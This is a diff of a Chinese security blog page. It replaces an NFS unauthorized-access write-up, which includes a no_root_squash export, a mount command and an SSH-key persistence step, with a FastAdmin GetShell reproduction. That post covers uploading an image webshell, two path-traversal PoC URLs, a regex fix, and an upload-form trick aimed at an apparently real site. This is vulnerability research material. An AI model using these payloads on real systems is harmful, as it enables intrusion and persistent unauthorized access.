@@ -7,7 +7,7 @@
 
     
 
-    <title>2h0nG&#39;s Blog</title>
+    <title>FastAdminv1.0.0.20200506_beta前台GetShell复现 | 2h0nG&#39;s Blog</title>
     <meta name="author" content="John Doe">
     
     <meta name="description" content="Love is friendship fell into love">
@@ -15,7 +15,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    
+    <meta property="og:title" content="FastAdminv1.0.0.20200506_beta前台GetShell复现"/>
     <meta property="og:site_name" content="2h0nG&#39;s Blog"/>
 
     
@@ -228,7 +228,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/漏洞复现与分析/">
-                    漏洞复现与分析 <span class="right">3 篇</span></a>
+                    漏洞复现与分析 <span class="right">4 篇</span></a>
                 </a>
             </li>
 
@@ -278,6 +278,10 @@
         <span class="breadcrumb">当前位置（分类目录）</span>
         
             
+    
+    
+    <a class="breadcrumb" href="/categories/漏洞复现与分析/">漏洞复现与分析</a>
+
 
         
 
@@ -293,12 +297,12 @@
             <div class="article-title">
                 
     
-        <h1>无题</h1>
+        <h1>FastAdminv1.0.0.20200506_beta前台GetShell复现</h1>
     
 
 
             </div>
-            <time class="pink-link-context" datetime="2020-11-01T13:11:24.198Z"><a href="/2020/11/01/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/NFS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">2020-11-01</a></time>
+            <time class="pink-link-context" datetime="2020-11-03T02:15:55.066Z"><a href="/2020/11/03/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/FastAdmin%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/">2020-11-03</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -306,57 +310,65 @@
 </span>
 
             
+    <div class="tags-row">
+        
+            <a href="/tags/漏洞复现与分析/" class="chip pink lighten-1">漏洞复现与分析</a>
+        
+    </div>
+
 
             <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#title-NFS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="section table-of-contents-text">title:NFS未授权访问</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#NFS%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="section table-of-contents-text">NFS未授权访问</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E5%A4%8D%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="section table-of-contents-text">复现漏洞</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="section table-of-contents-text">安装与配置</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="section table-of-contents-text">漏洞利用</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E9%85%8D%E7%BD%AESSH%E6%B0%B8%E4%B9%85%E9%93%BE%E6%8E%A5"><span class="section table-of-contents-text">配置SSH永久链接</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="section table-of-contents-text">漏洞分析</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#etc-exports%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="section table-of-contents-text">&#x2F;etc&#x2F;exports文件格式</span></a></li></ol></li></ol>
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="section table-of-contents-text">环境准备</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#%E8%AE%B0%E5%BD%95%E6%88%91%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="section table-of-contents-text">记录我环境配置出现的问题：</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="section table-of-contents-text">漏洞原理</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="section table-of-contents-text">漏洞复现</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#1%E3%80%81%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99%E5%A4%84%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="section table-of-contents-text">1、个人资料处上传图片马</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#2%E3%80%81POC"><span class="section table-of-contents-text">2、POC</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#3%E3%80%81%E5%9D%91%E7%82%B9%EF%BC%9A%E6%AD%A4%E5%A4%84%E5%9B%BE%E7%89%87%E9%A9%AC%E6%9C%89%E5%8F%AF%E8%83%BD%E5%9B%A0%E4%B8%BA%E5%9B%BE%E7%89%87%E6%9C%AC%E8%BA%AB%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%AF%BC%E8%87%B4%E6%89%A7%E8%A1%8C%E9%94%99%E8%AF%AF%EF%BC%81"><span class="section table-of-contents-text">3、坑点：此处图片马有可能因为图片本身的格式导致执行错误！</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="section table-of-contents-text">漏洞修复</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%97%B6%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8Ftrick"><span class="section table-of-contents-text">渗透测试时的一点小trick</span></a></li></ol>
 </div>
 
 
             <div class="entry pink-link-context">
-                <hr>
-<h2 id="title-NFS未授权访问"><a href="#title-NFS未授权访问" class="headerlink" title="title:NFS未授权访问"></a>title:NFS未授权访问</h2><h1 id="NFS未授权访问"><a href="#NFS未授权访问" class="headerlink" title="NFS未授权访问"></a>NFS未授权访问</h1><blockquote>
-<p>Debian架构：<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-50411-1-1.html?tdsourcetag=s_pcqq_aiomsg">https://bbs.ichunqiu.com/thread-50411-1-1.html?tdsourcetag=s_pcqq_aiomsg</a></p>
+                <h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://gitee.com/karson/fastadmin">https://gitee.com/karson/fastadmin</a>    #源码地址</p>
+<p><a target="_blank" rel="noopener" href="https://doc.fastadmin.net/docs/install.html">https://doc.fastadmin.net/docs/install.html</a>    #安装文档</p>
 </blockquote>
-<h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><h3 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 安装nfs服务</span><br><span class="line">yum install nfs-utils.x86_64 -y</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">systemctl start （如果这个服务不启动，nfs服务会启动失败）</span><br><span class="line">systemctl start nfs-server.service</span><br><span class="line"></span><br><span class="line"># 设置开机自启</span><br><span class="line">systemctl enable rpcbind.service</span><br><span class="line">systemctl enable nfs-server.service</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line"></span><br><span class="line"># 配置nfs</span><br><span class="line">vim &#x2F;etc&#x2F;exports</span><br><span class="line"></span><br><span class="line">&#x2F; *(rw,sync,no_root_squash)</span><br><span class="line"></span><br><span class="line"># 启动共享</span><br><span class="line">exportfs -r</span><br><span class="line"></span><br><span class="line"># 查看共享</span><br><span class="line">showmount -e</span><br><span class="line"></span><br><span class="line"># 客户端挂载命令</span><br><span class="line">mkdir &#x2F;tmp&#x2F;test</span><br><span class="line">mount -t nfs 10.10.10.5:&#x2F; &#x2F;tmp&#x2F;test</span><br><span class="line"></span><br><span class="line"># 查看挂载的目录，会出现所有的&#x2F;目录下的文件</span><br><span class="line">ls &#x2F;tmp&#x2F;test&#x2F;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/karson/fastadmin.git</span><br><span class="line"><span class="built_in">cd</span> fastadmin</span><br><span class="line">git <span class="built_in">log</span> --all</span><br><span class="line">git reset --hard 7e3205f</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要使用bower和composer两款包管理器来下载fastadmin需要的相关依赖库</span></span><br><span class="line">npm install -g bower    <span class="comment">#composer已经有了，安装个bower</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#开始安装依赖包</span></span><br><span class="line">bower install</span><br><span class="line">composer install</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建数据库并初始化数据</span></span><br><span class="line">php think install -u root -p root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 扫描nfs</span><br><span class="line">rpcinfo -p 10.10.10.5</span><br><span class="line"></span><br><span class="line"># 查看挂载内容</span><br><span class="line">showmount -e 10.10.10.5</span><br></pre></td></tr></table></figure>
+<p>环境准备完毕后显示自动生成了后台地址以及用户名密码。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bsnxl6"><img src="https://s1.ax1x.com/2020/11/03/Bsnxl6.png" alt="Bsnxl6.png"></a></p>
+<p>最后，在phpstudy中配置fastadmin的网页根目录为public，并且官方要求PHP版本大于 7.1 且 小于7.3，Mysql大于等于5.5.0（需要支持innodb引擎）。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BsKJ5d"><img src="https://s1.ax1x.com/2020/11/03/BsKJ5d.png" alt="BsKJ5d.png"></a></p>
+<p>环境搭建OK：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BsqasU"><img src="https://s1.ax1x.com/2020/11/03/BsqasU.png" alt="BsqasU.png"></a></p>
+<h2 id="记录我环境配置出现的问题："><a href="#记录我环境配置出现的问题：" class="headerlink" title="记录我环境配置出现的问题："></a><strong>记录我环境配置出现的问题：</strong></h2><p>1、在官方文档中Windows下PHPStudy安装fastadmin的教程中有一步是重写伪静态规则（.htaccess），按照教程的填写内容错误，修改为官方<a target="_blank" rel="noopener" href="https://gitee.com/karson/fastadmin/blob/v1.0.0.20200506_beta/public/.htaccess">git中的内容</a>才正确。</p>
+<p>2、PHPStudy中创建网站，也就是上面最后一步增加网页域名根目录映射后，由于其中静态规则的设置，会重写public下的.htaccess，如果为空，则直接将源码中原来的.htaccess置空，这直接导致我的网站运行错误，同1，.htaccess修改为官方源码中的即可。</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><blockquote>
+<p>原理看博客把，看完后下面会对POC有一定的解释。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sevck/p/13723094.html">https://www.cnblogs.com/sevck/p/13723094.html</a></p>
+</blockquote>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1、个人资料处上传图片马"><a href="#1、个人资料处上传图片马" class="headerlink" title="1、个人资料处上传图片马"></a>1、个人资料处上传图片马</h2><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bs1Esx"><img src="https://s1.ax1x.com/2020/11/03/Bs1Esx.png" alt="Bs1Esx.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bs1RkF"><img src="https://s1.ax1x.com/2020/11/03/Bs1RkF.png" alt="Bs1RkF.png"></a></p>
+<h2 id="2、POC"><a href="#2、POC" class="headerlink" title="2、POC"></a>2、POC</h2><p>​    这里我提供两个POC，原理是一样的，首先你要找到触发漏洞的controller点：_empty，这个函数默认在index这个application下的User.php中。这也是thinkphp访问url资源的方式：application/控制器名/函数，所以只要找到index/user/_empty就可以触发这个漏洞。</p>
+<p>​    另外_empty函数漏洞的主要原因是用户传入了一个可控的路径参数被模板渲染函数所解析，fetch函数就是ThinkPHP中渲染模板的函数，它支持执行带有php标签的代码。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BsHs0J"><img src="https://s1.ax1x.com/2020/11/03/BsHs0J.png" alt="BsHs0J.png"></a></p>
+<p>​    fetch函数的内部结构是首先通过了一个is_file()函数的判断，才真正去解析执行这个模板。在linux和windows下对于is_file函数的执行结果反应不同。比如在<code>C:\\Users\\18265\\信息.txt</code>有这样一个文件，<code>var_dump(is_file(&quot;C:\\abc\\..\\Users\\18265\\信息.txt&quot;));</code>的结果会是true，Windows下不管你目录遍历了多少，只要最终找到目标文件的逻辑正确，就是true。而Linux下，目录遍历中只要有一个处写错误了，比如说不存在这个abc文件夹，会直接判断为false。</p>
+<p>​    因此，再看看_empty漏洞点的内容，它使用fetch解析的模板文件路径是’user/‘+我们传入可控的参数的拼接结果，因为在当前工作目录public下不存在user这个文件夹，所以在linux中永远是false无法触发漏洞(除非你可以做到创建一个user文件夹在public下)，window下逻辑绕过即可。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BsqMqg"><img src="https://s1.ax1x.com/2020/11/03/BsqMqg.png" alt="BsqMqg.png"></a></p>
+<p>​    我们上传文件的文件夹upload就在public/uploads中，所以网上最多的POC是一种办法，直接user/../uploads/…又是一种办法。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.fa.com/index.php/index/user/_empty?name=/../../public/uploads/20201103/c23021b03d3b155f3f6d5d23af52a30e.gif    <span class="comment">#网上流传版本</span></span><br><span class="line"></span><br><span class="line">http://www.fa.com/index.php/index/user/_empty?name=/../uploads/20201103/c23021b03d3b155f3f6d5d23af52a30e.gif    <span class="comment">#我的版本</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="配置SSH永久链接"><a href="#配置SSH永久链接" class="headerlink" title="配置SSH永久链接"></a>配置SSH永久链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;security</span><br><span class="line">mount -t nfs 10.10.10.5:&#x2F; &#x2F;tmp&#x2F;security&#x2F;</span><br><span class="line"></span><br><span class="line"># 创建公钥</span><br><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line"># 复制公钥到服务器上</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &gt;&gt; &#x2F;tmp&#x2F;security&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/Bs7WLQ"><img src="https://s1.ax1x.com/2020/11/03/Bs7WLQ.png" alt="Bs7WLQ.png"></a></p>
+<h2 id="3、坑点：此处图片马有可能因为图片本身的格式导致执行错误！"><a href="#3、坑点：此处图片马有可能因为图片本身的格式导致执行错误！" class="headerlink" title="3、坑点：此处图片马有可能因为图片本身的格式导致执行错误！"></a>3、坑点：此处图片马有可能因为图片本身的格式导致执行错误！</h2><p>这里一开始我使用了我一直用的图片马，发现在触发漏洞时一直失败，踩了一上午的坑。最后想到在application/config.php中将app_debug的值赋值为true，来开启ThinkPHP的Debug模式。发现其实payload是正确的！报出的是一个ThrowableError的错误。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BsTih6"><img src="https://s1.ax1x.com/2020/11/03/BsTih6.png" alt="BsTih6.png"></a></p>
+<p>这里应该是执行错误后，把错误执行的代码内容存储到了fastadmin缓存文件夹中，来查看这个报错的php文件对应行数，发现乱码中出现了一些有实际意义但逻辑错误的符号字符等，这真的是一个小坑。所以我后来换了一个最简单的GIF头的图片马，成功复现漏洞。</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_empty</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/^([a-z0-9_]+)$/i&quot;</span>, $name)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(__(<span class="string">&#x27;Invalid parameters&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    $data = Hook::listen(<span class="string">&quot;user_request_empty&quot;</span>, $name);</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $index =&gt; $datum) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;view-&gt;assign($datum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;fetch(<span class="string">&#x27;user/&#x27;</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>总结：其实漏洞形成的原理就是权限不对，/etc/exports这个文件中的权限设置，我们上文采用的是root权限，所以导致服务器被入侵；</p>
-<h3 id="etc-exports文件格式"><a href="#etc-exports文件格式" class="headerlink" title="/etc/exports文件格式"></a>/etc/exports文件格式</h3><p>&lt;输出目录&gt; [客户端1 选项（访问权限,用户映射,其他）] [客户端2 选项（访问权限,用户映射,其他）]</p>
-<ul>
-<li>输出目录：输出目录是指NFS系统中需要共享给客户机使用的目录；</li>
-<li>客户端：客户端是指网络中可以访问这个NFS输出目录的计算机</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指定ip地址的主机：192.168.0.200</span><br><span class="line">指定子网中的所有主机：192.168.0.0&#x2F;24 192.168.0.0&#x2F;255.255.255.0</span><br><span class="line">指定域名的主机：david.bsmart.cn</span><br><span class="line">指定域中的所有主机：*.bsmart.cn</span><br><span class="line">所有主机：*</span><br></pre></td></tr></table></figure>
+<p>增加一条正则过滤。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BySEgs"><img src="https://s1.ax1x.com/2020/11/03/BySEgs.png" alt="BySEgs.png"></a></p>
+<h1 id="渗透测试时的一点小trick"><a href="#渗透测试时的一点小trick" class="headerlink" title="渗透测试时的一点小trick"></a>渗透测试时的一点小trick</h1><p>​    对于渗透测试时遇到的一些常见CMS、框架，想利用其某些文件上传或者解析漏洞却发现前端没有上传点，那么我们可以自己重写DOM去上传，因为后端虽然没有在前端使用这个上传功能，但不一定删除了后端对应的上传接口。这一点也可以通过访问接口来测试。测试存在该接口，直接写个上传点即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://pay.yuntevip.com/index/ajax/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>选项：选项用来设置输出目录的访问权限、用户映射等。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置输出目录只读：ro</span><br><span class="line">设置输出目录读写：rw</span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>用户映射选项</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">all_squash：将远程访问的所有普通用户及所属组都映射为匿名用户或用户组（nfsnobody）；</span><br><span class="line">no_all_squash：与all_squash取反（默认设置）；</span><br><span class="line">root_squash：将root用户及所属组都映射为匿名用户或用户组（默认设置）；</span><br><span class="line">no_root_squash：与rootsquash取反；</span><br><span class="line">anonuid&#x3D;xxx：将远程访问的所有用户都映射为匿名用户，并指定该用户为本地用户（UID&#x3D;xxx）；</span><br><span class="line">anongid&#x3D;xxx：将远程访问的所有用户组都映射为匿名用户组账户，并指定该匿名用户组账户为本地用户组账户（GID&#x3D;xxx）；</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>其它选项</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">secure：限制客户端只能从小于1024的tcp&#x2F;ip端口连接nfs服务器（默认设置）；</span><br><span class="line">insecure：允许客户端从大于1024的tcp&#x2F;ip端口连接服务器；</span><br><span class="line">sync：将数据同步写入内存缓冲区与磁盘中，效率低，但可以保证数据的一致性；</span><br><span class="line">async：将数据先保存在内存缓冲区中，必要时才写入磁盘；</span><br><span class="line">wdelay：检查是否有相关的写操作，如果有则将这些写操作一起执行，这样可以提高效率（默认设置）；</span><br><span class="line">no_wdelay：若有写操作则立即执行，应与sync配合使用；</span><br><span class="line">subtree：若输出目录是一个子目录，则nfs服务器将检查其父目录的权限(默认设置)；</span><br><span class="line">no_subtree：即使输出目录是一个子目录，nfs服务器也不检查其父目录的权限，这样可以提高效率；</span><br></pre></td></tr></table></figure>
                 
+
+
 <p class="pink-link-context">
     <a href="/2020/11/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PowerShell/" rel="next" title="PowerShell">
-    上一篇：PowerShell
-  </a>
-</p>
-
-
-
-<p class="pink-link-context">
-    <a href="/2020/11/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/CVE%E2%80%902020%E2%80%9014882-weblogic%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" rel="next" title="CVE‐2020‐14882 weblogic未授权命令执行复现">
-    下一篇：CVE‐2020‐14882 weblogic未授权命令执行复现
+    下一篇：PowerShell
   </a>
 </p>
 
